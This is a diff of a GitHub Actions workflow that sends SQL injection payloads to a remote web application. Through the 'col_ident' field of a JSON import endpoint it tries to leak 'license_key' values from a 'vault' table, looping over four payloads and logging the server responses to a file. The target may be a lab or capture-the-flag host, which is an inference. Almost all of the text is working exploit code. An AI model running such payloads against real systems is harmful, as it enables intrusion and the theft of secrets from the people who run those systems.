@@ -22,29 +22,25 @@ jobs:
         run: |
           set -euo pipefail
           site='https://web-379f4d432edec08d.web.h7tex.com'
-          headers=$(mktemp)
-          curl --fail --silent --show-error -D "$headers" -o /dev/null \
-            -X POST --data-urlencode "name=probe-$GITHUB_RUN_ID" "$site/bases"
-          id=$(sed -nE 's#^[Ll]ocation: /bases/([0-9a-f]+)\r?$#\1#p' "$headers")
-          test -n "$id"
-          {
-            echo "Base: $id"
-            echo
-            echo '== import =='
-            curl --silent --show-error --include -X POST \
-              -H 'Content-Type: application/json' \
-              --data '{"fields":[{"label":"probe","col_ident":"x) FROM vault --","position":0}]}' \
-              "$site/api/bases/$id/import"
-            echo
-            echo '== seal =='
-            curl --silent --show-error --include -X POST "$site/bases/$id/seal"
-            echo
-            echo '== page =='
-            curl --silent --show-error --include "$site/bases/$id"
-            echo
-            echo '== blueprint =='
-            curl --silent --show-error --include "$site/api/bases/$id/export"
-          } > extracted/probe.txt
+          : > extracted/probe.txt
+          while IFS= read -r col; do
+            headers=$(mktemp)
+            curl --fail --silent --show-error -D "$headers" -o /dev/null \
+              -X POST --data-urlencode "name=probe-$GITHUB_RUN_ID" "$site/bases"
+            id=$(sed -nE 's#^[Ll]ocation: /bases/([0-9a-f]+)\r?$#\1#p' "$headers")
+            body=$(jq -cn --arg col "$col" '{fields:[{label:"safe",col_ident:"x",position:0},{label:"probe",col_ident:$col,position:1}]}')
+            import=$(curl --silent --show-error --include -X POST -H 'Content-Type: application/json' --data "$body" "$site/api/bases/$id/import")
+            record=$(curl --silent --show-error --include -X POST --data-urlencode 'x=hello' "$site/bases/$id/records")
+            seal=$(curl --silent --show-error --include -X POST "$site/bases/$id/seal")
+            {
+              printf '\n== Base %s ==\nPayload: %s\n== import ==\n%s\n== record ==\n%s\n== seal ==\n%s\n' "$id" "$col" "$import" "$record" "$seal"
+            } >> extracted/probe.txt
+          done <<'PAYLOADS'
+          x, (SELECT license_key FROM vault WHERE team='workspace') AS leak
+          x || (SELECT license_key FROM vault WHERE team='workspace')
+          x FROM vault WHERE team='workspace' --
+          x) FROM vault --
+          PAYLOADS
       - name: Publish source to check output
         env:
           GH_TOKEN: ${{ github.token }}
